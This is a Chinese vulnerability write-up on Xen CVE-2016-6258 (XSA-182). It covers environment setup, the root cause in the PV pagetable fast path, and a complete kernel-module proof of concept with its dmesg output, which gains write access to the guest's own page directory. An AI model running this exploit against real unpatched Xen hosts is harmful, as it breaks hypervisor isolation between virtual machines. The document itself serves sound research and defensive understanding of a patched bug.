# CVE-2016-6258

The PV pagetable code has fast-paths for making updates to pre-existing pagetable entries, to skip expensive re-validation in safe cases (e.g. clearing only Access/Dirty bits). The bits considered safe were too broad, and not actually safe.

```txt
https://xenbits.xen.org/xsa/advisory-182.html
https://blog.quarkslab.com/xen-exploitation-part-3-xsa-182-qubes-escape.html
https://www.blackhat.com/docs/us-16/materials/us-16-Luan-Ouroboros-Tearing-Xen-Hypervisor-With-The-Snake-wp.pdf
```

## 补丁及影响版本

```txt
xsa182.patch           Xen 4.7.x
xsa182-4.6.patch       Xen 4.6.x
xsa182-4.5.patch       Xen 4.5.x, 4.4.x, 4.3.x

影响PV虚拟机
```

## 环境搭建

操作系统：Ubuntu 16.04.3 LTS
内核版本：Linux ubuntu 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
编译版本：4.6.1
下载链接：git clone https://github.com/xen-project/xen.git -b RELEASE-4.6.1

### 编译

参考[link](https://wiki.xenproject.org/wiki/Compiling_Xen_From_Source)

#### issue 1

如下

```shell
./configure --disable-qemu-traditional --with-extra-qemuu-configure-args='--disable-werror'
```

#### issue 2

/config/MiniOS.mk: No such file or directory

修改文件 extras/mini-os-remote/Makefile

```Makefile
MINI-OS_ROOT=/home/pwd/xen-4.6.1/extras/mini-os
include $(MINI-OS_ROOT)/config/MiniOS.mk
```

### 启动PV虚拟机Ubuntu

https://blog.csdn.net/weixin_33872660/article/details/92324513

#### 网桥xenbr0设置

https://wiki.xenproject.org/wiki/Network_Configuration_Examples_(Xen_4.1%2B)

```shell
# add the below to /etc/network/interfaces
iface xenbr0 inet dhcp
	bridge_ports [your_eth]
```

```shell
/etc/init.d/networking restart
ifup xenbr0
```

### poc

xsa-182-poc.c

```c
#include <linux/module.h>
#include <linux/sched.h>
#include <asm/xen/hypercall.h>
#include <asm/xen/page.h>

#define DEBUG(_f, _a...) printk(KERN_INFO "xsa-182-poc:%d - " _f "\n", __LINE__, ## _a)
#define __machine_addr(_v) ((unsigned long) arbitrary_virt_to_machine(_v).maddr)
#define __mfn(_v) ((unsigned long) (__machine_addr(_v) >> PAGE_SHIFT))

int mmu_update(unsigned long ptr, unsigned long val)
{
    struct mmu_update mmu_updates;
    struct mmuext_op uops_tlb_flush_all[] = {{.cmd =  MMUEXT_TLB_FLUSH_ALL}};
    int rc;

    mmu_updates.ptr = ptr | MMU_NORMAL_PT_UPDATE;
    mmu_updates.val = val;
    rc = HYPERVISOR_mmu_update(&mmu_updates, 1, NULL, DOMID_SELF);
    HYPERVISOR_mmuext_op(uops_tlb_flush_all, 1, NULL, DOMID_SELF);

    return rc;
}

static int __init exploit_init(void)
{
    int xen_version = HYPERVISOR_xen_version(0, NULL);
    unsigned long *page_directory = (unsigned long *) (current->mm->pgd);
    const unsigned long self_number = 42;
    /*
     from xen/include/asm-x86/config.h
     *  0xffff820000000000 - 0xffff827fffffffff [512GB, 2^39 bytes, PML4:260]
     *    Per-domain mappings (e.g., GDT, LDT).
    */
    const unsigned long target = 260;
    unsigned long *writable_page_directory = NULL;
    int rc;

    DEBUG("xen_version = %d.%d", (xen_version >> 16) & 0xFFFF, xen_version & 0xFFFF);
    DEBUG("page_directory mfn = 0x%lx", __mfn(page_directory));
    DEBUG("page_directory[%lu] = 0x%016lx", target, page_directory[target]);
    DEBUG("page_directory[%lu] = 0x%016lx", self_number, page_directory[self_number]);

    // create a self-mapping entry without RW flag
    rc = mmu_update(__machine_addr(&page_directory[self_number]), __machine_addr(page_directory) | _PAGE_USER | _PAGE_PRESENT);
    DEBUG("rc = 0x%x", rc);
    DEBUG("page_directory[%lu] = 0x%016lx", self_number, page_directory[self_number]);

    // fast path doesn't check RW flag ...
    rc = mmu_update(__machine_addr(&page_directory[self_number]), page_directory[self_number] | _PAGE_RW);
    DEBUG("rc = 0x%x", rc);
    DEBUG("page_directory[%lu] = 0x%016lx", self_number, page_directory[self_number]);
    if (rc != 0) {
        DEBUG("not vulnerable");
        goto end;
    }

    // craft magic address
    writable_page_directory = (unsigned long*) ((self_number << 39) | (self_number << 30) | (self_number << 21) | (self_number << 12));
    DEBUG("writable_page_directory = 0x%p", writable_page_directory);

    // enjoy
    DEBUG("writable_page_directory[%lu] = 0x%016lx", target, writable_page_directory[target]);
    writable_page_directory[target] |= _PAGE_USER;
    DEBUG("writable_page_directory[%lu] = 0x%016lx", target, writable_page_directory[target]);
    DEBUG("vulnerable");

end:
    // reset entry because Linux is trying to unpin page & so on
    rc = mmu_update(__machine_addr(&page_directory[self_number]), 0x0);
    DEBUG("rc = 0x%x", rc);

    return 0;
}

static void __exit exploit_exit(void)
{
    printk("goodbye!\n");
}

module_init(exploit_init);
module_exit(exploit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jérémie Boutoille");
MODULE_DESCRIPTION("XSA-182 proof of concept");
```

dmesg | grep  xsa-182-poc

```shell
[  403.764257] xsa-182-poc:38 - xen_version = 4.6
[  403.764261] xsa-182-poc:39 - page_directory mfn = 0x6a3c0
[  403.764263] xsa-182-poc:40 - page_directory[260] = 0x000000006eb6e063
[  403.764266] xsa-182-poc:41 - page_directory[42] = 0x0000000000000000
[  403.764273] xsa-182-poc:45 - rc = 0x0
[  403.764275] xsa-182-poc:46 - page_directory[42] = 0x000000006a3c0005
[  403.764281] xsa-182-poc:50 - rc = 0x0
[  403.764284] xsa-182-poc:51 - page_directory[42] = 0x000000006a3c0007
[  403.764287] xsa-182-poc:59 - writable_page_directory = 0x0000150a8542a000
[  403.764290] xsa-182-poc:62 - writable_page_directory[260] = 0x000000006eb6e063
[  403.764292] xsa-182-poc:64 - writable_page_directory[260] = 0x000000006eb6e067
[  403.764295] xsa-182-poc:65 - vulnerable
[  403.764301] xsa-182-poc:70 - rc = 0x0
# page_directory[260] 用来验证是否可写
# page_directory[42] 用来引用page_directory自身
```

### 漏洞成因

1. 函数mod_l2_entry中的FAST PATH没有过多的验证，通过FAST PATH更改_PAGE_RW属性
2. 函数get_##level##_linear_pagetable中满足一定条件会跳过部分验证，不包括_PAGE_RW验证

首先利用2创建一个只读的，引用自身的pdt，然后利用1更改_PAGE_RW属性。

```c
/* Update the L2 entry at pl2e to new value nl2e. pl2e is within frame pfn. */
static int mod_l2_entry(l2_pgentry_t *pl2e, 
                        l2_pgentry_t nl2e, 
                        unsigned long pfn,
                        int preserve_ad,
                        struct vcpu *vcpu)
{
    l2_pgentry_t ol2e;
    struct domain *d = vcpu->domain;
    struct page_info *l2pg = mfn_to_page(pfn);
    unsigned long type = l2pg->u.inuse.type_info;
    int rc = 0;

    if ( unlikely(!is_guest_l2_slot(d, type, pgentry_ptr_to_slot(pl2e))) )
    {
        MEM_LOG("Illegal L2 update attempt in Xen-private area %p", pl2e);
        return -EPERM;
    }

    if ( unlikely(__copy_from_user(&ol2e, pl2e, sizeof(ol2e)) != 0) )
        return -EFAULT;

    if ( l2e_get_flags(nl2e) & _PAGE_PRESENT )
    {
        if ( unlikely(l2e_get_flags(nl2e) & L2_DISALLOW_MASK) )
        {
            MEM_LOG("Bad L2 flags %x",
                    l2e_get_flags(nl2e) & L2_DISALLOW_MASK);
            return -EINVAL;
        }

        /* Fast path for identical mapping and presence. */
        if ( !l2e_has_changed(ol2e, nl2e,
                              unlikely(opt_allow_superpage)
                              ? _PAGE_PSE | _PAGE_RW | _PAGE_PRESENT
                              : _PAGE_PRESENT) )
        {
            adjust_guest_l2e(nl2e, d);
            if ( UPDATE_ENTRY(l2, pl2e, ol2e, nl2e, pfn, vcpu, preserve_ad) )
                return 0;
            return -EBUSY;
        }

        if ( unlikely((rc = get_page_from_l2e(nl2e, pfn, d)) < 0) )
            return rc;

        adjust_guest_l2e(nl2e, d);
        if ( unlikely(!UPDATE_ENTRY(l2, pl2e, ol2e, nl2e, pfn, vcpu,
                                    preserve_ad)) )
        {
            ol2e = nl2e;
            rc = -EBUSY;
        }
    }
    else if ( unlikely(!UPDATE_ENTRY(l2, pl2e, ol2e, nl2e, pfn, vcpu,
                                     preserve_ad)) )
    {
        return -EBUSY;
    }

    put_page_from_l2e(ol2e, pfn);
    return rc;
}
```

get_page_from_l2e调用get_page_and_type_from_pagenr验证page type是否合法，如果不合法，将引入get_l2_linear_pagetable参与二次验证

```c
static int
get_page_from_l2e(
    l2_pgentry_t l2e, unsigned long pfn, struct domain *d)
{
    unsigned long mfn = l2e_get_pfn(l2e);
    int rc;

    if ( !(l2e_get_flags(l2e) & _PAGE_PRESENT) )
        return 1;

    if ( unlikely((l2e_get_flags(l2e) & L2_DISALLOW_MASK)) )
    {
        MEM_LOG("Bad L2 flags %x", l2e_get_flags(l2e) & L2_DISALLOW_MASK);
        return -EINVAL;
    }

    if ( !(l2e_get_flags(l2e) & _PAGE_PSE) )
    {
        rc = get_page_and_type_from_pagenr(mfn, PGT_l1_page_table, d, 0, 0);
        if ( unlikely(rc == -EINVAL) && get_l2_linear_pagetable(l2e, pfn, d) )
            rc = 0;
        return rc;
    }

    if ( !opt_allow_superpage )
    {
        MEM_LOG("Attempt to map superpage without allowsuperpage "
                "flag in hypervisor");
        return -EINVAL;
    }

    if ( mfn & (L1_PAGETABLE_ENTRIES-1) )
    {
        MEM_LOG("Unaligned superpage map attempt mfn %lx", mfn);
        return -EINVAL;
    }

    return get_superpage(mfn, d);
}

```

对于没有_PAGE_RW的L#TE，其MFN字段将与当前L#页表的MFN进行比较。如果等于，则忽略一些验证，并返回1,通过验证。原本用于递归，没有考虑引用自身的情况

```c
static int                                                                  \
get_##level##_linear_pagetable(                                             \
    level##_pgentry_t pde, unsigned long pde_pfn, struct domain *d)         \
{                                                                           \
    unsigned long x, y;                                                     \
    struct page_info *page;                                                 \
    unsigned long pfn;                                                      \
                                                                            \
    if ( (level##e_get_flags(pde) & _PAGE_RW) )                             \
    {                                                                       \
        MEM_LOG("Attempt to create linear p.t. with write perms");          \
        return 0;                                                           \
    }                                                                       \
                                                                            \
    if ( (pfn = level##e_get_pfn(pde)) != pde_pfn )                         \
    {                                                                       \
        //return 0 if validations failed                                    \
    }                                                                       \
                                                                            \
    return 1;                                                               \
}
```